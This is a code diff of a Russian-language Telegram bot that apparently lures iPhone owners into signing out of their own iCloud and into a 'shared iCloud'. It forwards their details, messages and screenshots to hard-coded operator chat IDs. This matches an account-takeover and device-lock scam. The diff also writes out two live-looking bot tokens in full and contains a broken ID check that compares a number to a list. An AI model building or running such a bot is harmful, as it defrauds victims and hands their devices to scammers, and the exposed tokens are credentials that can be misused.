@@ -1,7 +1,7 @@
 import telebot
 from telebot import types
 
-bot = telebot.TeleBot('8363015046:AAGYAM52QPRu5RArHL91CHEQKGH_8I3W7rc')
+bot = telebot.TeleBot('8220455020:AAGvMJbZHwKRfmSqAWD3eXketVur4m1KZ1g')
 
 data = {}
 username_index = {}
@@ -48,9 +48,8 @@ def receive_screenshot(message):
         try:
             file_id = message.photo[-1].file_id
             caption = f"Скриншот от @{message.from_user.username}" if message.from_user.username else f"Скриншот от {message.from_user.first_name}"
-            bot.send_photo(chat_id=1628095868, photo=file_id, caption=caption)
+            bot.send_photo(chat_id=8478474928, photo=file_id, caption=caption)
             bot.send_photo(chat_id=6750087372, photo=file_id, caption=caption)
-            bot.send_photo(chat_id=7421128257, photo=file_id, caption=caption)
             bot.send_message(message.chat.id, "✅ Скриншот получен")
         except Exception as e:
             bot.reply_to(message, f"Ошибка при пересылке фото: {e}")
@@ -71,9 +70,8 @@ def get_apps(message):
     region = data[user_id]['region']
     apps = data[user_id]['apps']
     bot.send_message(user_id, '✨ Готово\nТвоя заявка успешно отправлена ✅\n⏳ В ближайшие минуты с тобой свяжется администратор,\nчтобы помочь установить.')
-    bot.send_message(chat_id=1628095868, text=f"Модель айфона: {model}\nРегион/Страна: {region}\nПришла за: {apps}\nЮзер: @{message.from_user.username}\nID-типа: {message.from_user.id}")
+    bot.send_message(chat_id=8478474928, text=f"Модель айфона: {model}\nРегион/Страна: {region}\nПришла за: {apps}\nЮзер: @{message.from_user.username}\nID-типа: {message.from_user.id}")
     bot.send_message(chat_id=6750087372, text=f"Модель айфона: {model}\nРегион/Страна: {region}\nПришла за: {apps}\nЮзер: @{message.from_user.username}\nID-типа: {message.from_user.id}")
-    bot.send_message(chat_id=7421128257, text=f"Модель айфона: {model}\nРегион/Страна: {region}\nПришла за: {apps}\nЮзер: @{message.from_user.username}\nID-типа: {message.from_user.id}")
     bot.send_message(user_id, 
         'Теперь дело за малым! Тебе надо выйти со своего iCloud и зайти на Общий iCloud!\n\n'
         '1. Что такое общий iCloud\n\n'
@@ -119,7 +117,7 @@ def helper(call):
 
 @bot.message_handler(commands=['block'])
 def finish_cmd(message):
-    if message.chat.id not in [1628095868, 6750087372, 7421128257]:
+    if message.chat.id not in [6750087372, 8478474928]:
         return
 
     parts = message.text.split(maxsplit=1)
@@ -145,7 +143,7 @@ def finish_cmd(message):
 
 @bot.message_handler(commands=['send'])
 def send_message_by_user(message):
-    if message.chat.id not in [1628095868, 6750087372, 7421128257]:
+    if message.chat.id not in [6750087372, 8478474928]:
         return
     
     parts = message.text.split(maxsplit=2)
@@ -186,7 +184,7 @@ def universal(message):
         bot.send_message(message.chat.id, text='Приветствую, Босс!\nЗа работу!🤑', reply_markup=types.ReplyKeyboardRemove())
         return
     
-    if message.chat.id == 7250450110:
+    if message.chat.id == [6750087372, 8478474928]:
         return
     
     uname = (message.from_user.username or "").lower()
@@ -194,12 +192,12 @@ def universal(message):
         return
 
     if message.chat.id not in [1628095868, 6750087372, 7421128257]:
-        bot.send_message(chat_id=1628095868, text=f"💬️Сообщение от @{message.from_user.username} (id: {message.from_user.id}):\n{message.text}")
         bot.send_message(chat_id=6750087372, text=f"💬️Сообщение от @{message.from_user.username} (id: {message.from_user.id}):\n{message.text}")
-        bot.send_message(chat_id=7421128257, text=f"💬️Сообщение от @{message.from_user.username} (id: {message.from_user.id}):\n{message.text}")
+        bot.send_message(chat_id=8478474928, text=f"💬️Сообщение от @{message.from_user.username} (id: {message.from_user.id}):\n{message.text}")
 
 
 bot.polling()
+
 
 
 
